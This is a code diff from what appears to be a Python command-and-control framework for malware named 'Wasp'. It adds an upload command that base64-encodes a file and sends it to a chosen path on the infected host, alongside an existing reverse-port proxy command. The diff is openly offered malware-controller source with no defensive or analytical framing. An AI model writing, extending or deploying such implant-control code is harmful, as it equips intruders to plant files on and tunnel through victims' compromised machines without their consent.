@@ -4,8 +4,7 @@ from typing import Dict, List, Optional
 from pathlib import Path
 import logging
 import base64
-
-from wasp_types import WaspCommand, WaspResponse, WaspMalware, logger, WaspCommandClass
+from wasp_types import WaspCommand, WaspResponse, WaspMalware, logger, WaspCommandClass, WaspCommandChunked
 
 @WaspCommandClass
 class WaspCommandHandshake(WaspCommand):
@@ -173,3 +172,42 @@ class WaspCommandProxy(WaspCommand):
     def handle_response(self, response: WaspResponse):
         self.logger.info(f"Proxying {self.reverse_port} to {self.destination_host}:{self.destination_port}")
 
+@WaspCommandClass
+class WaspCommandUpload(WaspCommandChunked):
+    name: str = "upload"
+
+    path: Path
+    file_content: bytes
+    
+    def __init__(self, wasp: WaspMalware, path: Path, file_content: bytes | Path) -> None:
+        super().__init__(wasp)
+
+        if isinstance(file_content, Path):
+            file_content = file_content.read_bytes()
+
+        self.path = path
+        self.file_content = file_content
+
+    def get_dict(self) -> Dict:
+        return {
+            'uri': self.name,
+            'headers': {
+                'File-Path': str(self.path),
+                # TODO: This is bad, we'll actually send the file twice. We need this so our current serialization
+                # works. We pack this into the JSON so we can load from disk.
+                'File-Data': base64.b64encode(self.file_content).decode('utf-8'),
+            },
+        }
+
+    @classmethod
+    def from_dict(cls, wasp: WaspMalware, source: Dict) -> WaspCommand:
+        path: Path = Path(source["headers"]["File-Path"])
+        file_data: bytes = base64.b64decode(source["headers"]["File-Data"])
+        command: WaspCommand = cls(wasp, path, file_data)
+        return command
+
+    def handle_response(self, response: WaspResponse):
+        self.logger.info(f"Uploaded {len(self.file_content)} to {self.path}")
+    
+    def get_data(self) -> bytes:
+        return self.file_content
